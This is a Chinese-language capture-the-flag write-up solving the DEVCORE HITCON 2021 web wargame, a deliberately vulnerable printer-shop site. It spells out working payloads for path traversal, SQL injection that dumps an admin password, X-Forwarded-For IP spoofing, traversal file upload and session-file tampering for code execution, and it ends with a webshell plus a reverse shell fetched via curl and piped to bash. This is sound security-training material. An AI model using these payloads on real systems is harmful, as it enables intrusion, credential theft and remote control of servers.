---
title: DEVCORE WarGame (Web) for HITCON 2021 Writeup
date: 2021-11-29T13:42:00+08:00
draft: false
url: "/2021/11/29/devcore-wargame-web-for-hitcon-2021-writeup/"
categories:
  - 資訊安全
  - Writeup
showToc: true
TocOpen: false
---

# DEVCORE WarGame (Web) for HITCON 2021 Writeup

By Steven Meow

- URL : https://wargame.devcore.tw/Web : http://web.ctf.devcore.tw/今年與去年一樣，在 HITCON 會場上有 DEVCORE 的擺攤，解 Wargame 就可以換小獎品與 NFT，而且據說今年的題目都是來自現實生活中的真實案例改編，我覺得題目比起去年明顯的簡單了不少。但我還是覺得在 HITCON 辦這種活動不太優 QQ 會害人無法專心聽議程，都在解題。畢竟這種 Conf，我覺得聽議程還是比較重要 Q__Q。

## 弱點 01 Path Traversal

- 簡單逛一下網頁會發現是一個印表機的訂購網站![](/uploads/2022/02/2b57f-R84Kf43.png)觀察進入網頁首頁的 HTTP Request 可以看到一個明顯可疑的 URL- `http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=`
- ![](/uploads/2022/02/d68ad-i6Pk2gV.png)根據一點點的小直覺，可以猜出 ID 的參數是透過 Base64 編碼的 (因為結尾有出現`=`)- 解碼後可以看出是圖片的檔名![](/uploads/2022/02/740d8-VxSOnZ7.png)而直接訪問則會出現印表機的圖片- ![](/uploads/2022/02/355d1-S515CC1.png)我們可以合理的猜測這可能有一個任意讀檔，或是 LFI 的漏洞，前提是需要把路徑轉 Base64 再放入 ID- 首先測試 `/etc/passwd`
- 透過 `echo -n '../../../../../../../etc/passwd' | base64 -w0`
- 可以取得 `Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==`
- 再把 Base64 的結果串上網址的 ID，用 curl 送 request
- 發現可以順利取得 `/etc/passwd`![](/uploads/2022/02/966d1-8u1ZWOG.png)
- 而且告訴了我們 Flag 在 php 原始碼裡面至此，可以非常合理的確認我們可以讀檔了我們也可以把指令寫的更直觀一點- `curl http://web.ctf.devcore.tw/image.php?id=$(echo -n '../../../../../../../etc/passwd' | base64 -w0)`
- 未來只需要修改路徑就可以快速發送 Requests尋找網頁根目錄- 通常，預設的網頁根目錄會放在 `/var/www/html`但這個網站看起來有刻意的設計過，所以檔案目標不在這邊
- ![](/uploads/2022/02/2f542-6JOe6a2.png)在現代，為了方便，大多數的服務都會透過 Docker 來進行部屬 (特別是 CTF 題目，被打爛了可以快速砍掉重架)，而 Docker 通常會透過 Mount 目錄等方法，使 Docker 內外互通- 我們可以透過 `/proc/1/mountinfo` 或是 `/proc/self/mounts` 看到一些掛載的資訊![](/uploads/2022/02/aa7c4-6JxkfnC.png)
- 從上面的一堆垃圾可以確認我們真的在 docker 裡面
- 另外我們可以注意到下面有一些有趣的東西
- `/usr/share/nginx/images`
- `/usr/share/nginx/b8ck3nd`
- `/usr/share/nginx/frontend`
- 我們可以合理懷疑原始碼就藏在這幾個路徑裡面取得原始碼- 前端首頁 (後面只寫路徑)`curl http://web.ctf.devcore.tw/image.php?id=$(echo -n '../../../../../../../usr/share/nginx/frontend/index.php' | base64 -w0)`可以發現裡面有 `require_once('include.php');`前端 include- `/usr/share/nginx/frontend/include.php`![](/uploads/2022/02/4bbe2-uopkjq9.png)
- 就順利取得 Flag 1 了前端 image- `/usr/share/nginx/frontend/image.php`
- 可以發現它只是 Base64 解開丟 `readfile($file);`，所以沒有 LFI ，只能任意讀檔官方報告

## - ![](/uploads/2022/02/b9630-OwUZxEz.png)

## 弱點 02：Broken Access Control

- 開始玩一下網頁的功能立刻訂購`index.php`
- ![](/uploads/2022/02/ec43f-feoMDXA.png)訂購成功- `submit.php`
- ![](/uploads/2022/02/9a30c-bkD4FI2.png)訂單資訊- `order.php?id=35163&sig=PFRo8eZYWmnXmM4UJfApOvPZlnBtQoIsoRejgCzlIe5fkPu8FnxhYmD56zlSblHY`
- 雖然我們看到了一些參數，但不需要急著 SQL injection，因為我們可以透過第一個漏洞來讀原始碼，確認有沒有漏洞查看收據- `receipt.php?id=35163&sig=PFRo8eZYWmnXmM4UJfApOvPZlnBtQoIsoRejgCzlIe5fkPu8FnxhYmD56zlSblHY`
- ![](/uploads/2022/02/97aa3-WHIrJCX.png)列印- 按下去後會出現一個匯出 PDF 的頁面
- ![](/uploads/2022/02/e9144-U2c8Vgb.png)匯出 PDF- `print.php?id=35163&sig=PFRo8eZYWmnXmM4UJfApOvPZlnBtQoIsoRejgCzlIe5fkPu8FnxhYmD56zlSblHY`
- ![](/uploads/2022/02/8c75a-PvrYsRy.png)觀察以上幾個頁面的原始碼，我們可以快速的發現 `print.php` 上面有一個 SQL injection 的弱點 `php $res = $pdo->query(" SELECT * FROM orders WHERE sig_hash = '$sig_hash' AND id = $id LIMIT 1 ", PDO::FETCH_ASSOC);`- 使用者可控 `id` 的部分我們可以隨意來寫個`http://web.ctf.devcore.tw/print.php?sig=1&id=1 or 1=1`然後就拿到 Flag 了 ?__?![](/uploads/2022/02/5c687-dRSdji9.png)官方報告- ![](/uploads/2022/02/25663-01eHh4h.png)欸好ㄛ，我的方法是一個非預期解的意思，那我們來看一下正規解- `http://web.ctf.devcore.tw/order.php?id=1&sig[]=`
- 就拿到 Flag 了
- ![](/uploads/2022/02/48c5d-JVKEzIm.png)
- 而原理可以看官方報告上有詳述，主要就是因為 sig 參數給予一個 `[]` 代表陣列，會讓 php 解到爛掉

## 弱點 04：Use of Less Trusted Source

- 對，我先寫 4 ，因為我先解出 4 才找到 3 的
- 剛剛我們找到了一個 SQL injection 的漏洞，所以可以用 SQL injection 來取得所有資料庫裡面的資料所以需要先透過 `information_schema` 那一串套路去看 SQL 裡面有哪些 DB 、 Table 、 Column 再來選嗎?答案是不用的，因為我們已經有完整的 Source Code 所以可以直接看!觀察檔案- 從最最前面 mount 的資料夾中，我們可以看到其中有一個 `b8ck3nd` 的資料夾
- `b8ck3nd/index.php`裡面有 `include.php` , `upload.php``b8ck3nd/include.php`- 裡面有一段說到，我們的 IP 必須為 `['127.0.0.1', '172.18.11.89']` 才能進入後台，不然會被導向首頁
- 還有說到，沒有登入的話，會被導到 `login.php``b8ck3nd/login.php`- 裡面有一段 `SELECT * FROM backend_users WHERE username = %s AND password = %s'`它的 `username` 跟 `password` 都會經過 quote，所以不能從這邊直接的進行 SQL injection
- 但我們可以確定 Table `backend_users` 裡面一定有 `username`, `password` 這兩個 Column正式 SQL injection- 回到前一題的 SQL injection 如果我們給予 `or 1=1` 的話，可以取得 Flag2 ，如果給予 `or 1=0` 的話，則畫面會空白，最無腦的方法就是使用 Boolean based 的 SQL injection
- 不過由於它回傳的是一個 PDF 檔案，所以 SQLMap 會解到壞掉這邊我使用 `import pdftotext` 來讀取 PDF 的內容，如果 `steven` 這個詞出現在 PDF 中，就代表 True ，不然就代表 False
- 自己刻一個 Binary Search 的 Boolean Based SQL injection Payload 就可以爆出資料庫的所有資料了，我有程式碼但寫得很醜，就先不公布ㄌ XDD。![](/uploads/2022/02/6b2af-Spg2OJ4.png)另外一種解法 (Wii Wu 提供)- 其實可以透過 UNION Based 的方法來取
- `http://web.ctf.devcore.tw/print.php?id=-1 UNION SELECT id as id, username as email, password AS phone ,NULL,NULL,NULL,NULL,NULL,NULL FROM backend_users`
- ![](/uploads/2022/02/59b89-XuljiRm.png)至此我們可以取得- `username` : `admin`
- `password` : `u=479_p5jV:Fsq(2`回到前面說的 `b8ck3nd/include.php`- 我們必須要使用 `127.0.0.1` 或是 `172.18.11.89` IP 才能進入後台
- 最常見的方法是透過修改 `X-Forwarded-For` 的 Header 來進行達成詳見 : https://devco.re/blog/2014/06/19/client-ip-detection/
- 通常大多數人會使用 BurpSuite 進行修改，不過我個人推薦使用更懶人的 [Firefox Plugin](https://addons.mozilla.org/zh-TW/firefox/addon/x-forwarded-for-injector/)![](/uploads/2022/02/973fb-5ZPJqKN.png)順利訪問後台 `http://web.ctf.devcore.tw/b8ck3nd/login.php`- ![](/uploads/2022/02/33c2f-6ALeobD.png)可以使用上述的帳密進行登入，取得 Flag 4- ![](/uploads/2022/02/578de-Qh77w9q.png)官方報告- ![](/uploads/2022/02/cc809-CZSvwcE.png)
- 好的，看起來很符合

## - 但我的 Flag3 去哪了 QQ

## 弱點 03：SQL Injection

- 其實我合理猜測是因為我們快速地透過原始碼取得 Column 跟 Table 進行登入，但省略了某些東西，Flag 在裡面。因為至今還沒有出現 SQL injection 的弱點報告，但我們都透過 SQLinjection 取得兩個 Flag 了 XDDDD
- 接下來我就直接借用 Wii Wu 提供的 Union Based 來寫使用 SQL 取得 DB, Table, Column 的老梗來找
- 但我想反著找，看看 `backend_users` 裡面有沒有什麼有趣的其他 Column
- `http://web.ctf.devcore.tw/print.php?id=-1 UNION SELECT NULL, NULL, group_concat(column_name), NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='backend_users'`
- ![](/uploads/2022/02/b31f0-o31GKDh.png)
- 我們可以看到還有一個 description 的 column取得 `description` 欄位的值即為 Flag- `http://web.ctf.devcore.tw/print.php?id=-1 UNION SELECT NULL, NULL, description, NULL, NULL, NULL, NULL, NULL, NULL FROM backend_users`
- ![](/uploads/2022/02/26729-0IH0UAf.png)官方報告

## - ![](/uploads/2022/02/dad5c-Ywwd7gg.png)

## 弱點 05：Unrestricted File Upload

- 接下來繼續地回到了 Code Review 的環節`b8ck3nd/index.php`裡面發現會把一些資訊傳到 `upload.php``b8ck3nd/upload.php`- 程式分成了兩個部分如果透過 GET Method 進入，會回傳一段 JWT，但對於解題沒有任何幫助
- 下面有一段是沒有任何前端對應的後端 API可以上傳檔案
- 參數 `rename` 可以指定檔案名稱
- 參數 `folder` 可以指定檔案資料夾會透過 `$filename = $folder.'/'.$filename;` 直接把資料夾跟檔名進行串接
- 很值觀的猜測可以用 folder 來進行任意位置寫入所以我們可以隨便上傳一個檔案看看，但要記得帶上 Header 跟 Session Cookie，但當大家看到這篇時，理論上下面的 Session 已經過期ㄌ- `echo meow > meow.txt`
- Session Cookie 可以透過瀏覽器 F12 取得
- `curl -H 'X-Forwarded-For: 127.0.0.1' --cookie 'PHPSESSID=5qh67f4o30aa8r2313gjv8iucd' -F 'file=@meow.txt' -F 'rename=meow.txt' -F 'folder=../../../../../../tmp' http://web.ctf.devcore.tw/b8ck3nd/upload.php`上面的 command 丟出去就可以取得 Flag5- ![](/uploads/2022/02/98a59-GdtGfV5.png)官方報告

## - ![](/uploads/2022/02/1a4a6-0Mm0g9c.png)

## 弱點 06：Local File Inclusion

- 我覺得這一段是全部裡面最難的部分，我個人卡了超級超級久
- 首先大家應該會非常直觀的想到如果我把程式碼寫到 `frontend/`, `images/`, 或 `b8ck3nd`，是不是就可以成功地拿到 Webshell
- 但事實真正的嘗試會發現這些目錄都不可寫回到觀察程式碼的部分- `frontend/include.php`我們可以發現有一行 `require_once('langs/' . $_SESSION['lang'] . '.php');`
- 而如果我們訪問 `frontend/index.php` 就會呼叫到 `frontend/include.php`所以 …… 這邊會是一個 LFI 的漏洞嗎?- LFI 的前提要是 Session 可控
- 我們可以查資料發現到，PHP 的 Session 資料會放在 `/tmp/sess_{SESSION_ID}`
- ![](/uploads/2022/02/59021-plX6UPT.png)
- 我們使用弱點 1 就可以快速的取得目前我們的 Session 資料那我們是不是可以把 Session 資料載下來，自己進行竄改之後達成 LFI 2 RCE 呢?- 假設我們使用弱點 6 寫入一個 Webshell 在 `/tmp/meowmeow.php`
- 再來，控制 `$_SESSION['lang']` ，設定為 `../../../../../../tmp/meowmeow` (在`frontend/include.php` 會自動幫我們加上 `.php`)
- 訪問網頁首頁即可取得 webshell首先我們先下載 `curl http://web.ctf.devcore.tw/image.php?id=$(echo -n '../../../../../../../tmp/sess_5qh67f4o30aa8r2313gjv8iucd' | base64 -w0) -o sess_meow`- 內容是 `lang|s:5:"zh-tw";user_id|s:1:"1";`
- 就算不懂結構我們也可以猜出`zh-tw` 是我們需要變更的部分
- `s:5` 是後面接的字串長度所以我們準備一個檔案- `lang|s:33:"../../../../../../../tmp/meowmeow";user_id|s:1:"1";`
- 上傳到 `/tmp/sess_meowmeow`
- `curl -H 'X-Forwarded-For: 127.0.0.1' --cookie 'PHPSESSID=5qh67f4o30aa8r2313gjv8iucd' -F 'file=@sess_meowmeow' -F 'rename=sess_meowmeow' -F 'folder=../../../../../../tmp' http://web.ctf.devcore.tw/b8ck3nd/upload.php`
- 可以觀察確定上傳正確![](/uploads/2022/02/1e072-JYxdBro.png)再準備一個 webshell- `` 命名為 `meowmeow.php`
- 上傳到 `/tmp/meowmeow.php`
- `curl -H 'X-Forwarded-For: 127.0.0.1' --cookie 'PHPSESSID=5qh67f4o30aa8r2313gjv8iucd' -F 'file=@meowmeow.php' -F 'rename=meowmeow.php' -F 'folder=../../../../../../tmp' http://web.ctf.devcore.tw/b8ck3nd/upload.php`
- 確認檔案上傳正確![](/uploads/2022/02/a83fc-5mzTa7g.png)最後我們只需要使用 `meowmeow` 這個 Session ID 訪問 index.php 即可拿到 Webshell- `curl -H 'X-Forwarded-For: 127.0.0.1' --cookie 'PHPSESSID=meowmeow' http://web.ctf.devcore.tw/index.php?meow=ls`
- ![](/uploads/2022/02/24cd2-1hCyJ81.png)當然我們也可以用酷炫的方法拿 Reverse Shell- (需要自備一個有對外 IP 的電腦或 Ngrok，不做這一段也可拿 Flag)
- 首先在機器上準備一個 `s8787` 檔案`bash -c 'bash -i >& /dev/tcp/{自己的IP}/8787 0>&1'`輸入 `python3 -m http.server 8000`- 開啟一個 Python HTTP Server在自己電腦上開一個 nc 接收- `rlwrap nc -nlvp 7877` (沒有 rlwrap 就直接 nc 也可)`curl -H 'X-Forwarded-For: 127.0.0.1' --cookie 'PHPSESSID=meowmeow' 'http://web.ctf.devcore.tw/index.php?meow=curl%20http://{自己的IP}:8000/s8787%20%7C%20/bin/bash'`執行下去後，會發現 Python HTTP Server 接收到了一個 Request- ![](/uploads/2022/02/8a0dc-sumZghO.png)我們的 nc 端也收到一個 Reverse Shell- ![](/uploads/2022/02/dad59-EALEmrS.png)觀察根目錄的檔案- ![](/uploads/2022/02/7c82d-Ed5tzVq.png)
- 我們會發現沒有權限讀 flag，但是我們有一個檔案叫做 `readflag`，它有 SUID 且 Owner 是 Root
- 透過 file 觀察可以確定它是一個執行檔
- ![](/uploads/2022/02/0kz80GO.png)直接執行 `./readflag` 即可取得 Flag

![](/uploads/2022/02/c0e06-JW65c0h.png)

- 當然我們有 Webshell 的話，不用 Reverse Shell 也可以直接取得 Flag`curl -H 'X-Forwarded-For: 127.0.0.1' --cookie 'PHPSESSID=meowmeow' 'http://web.ctf.devcore.tw/index.php?meow=/readflag'`

![](/uploads/2022/02/Yy53o6i-1024x109.png)

- 官方報告

![](/uploads/2022/02/OkElNCW-1024x505.png)
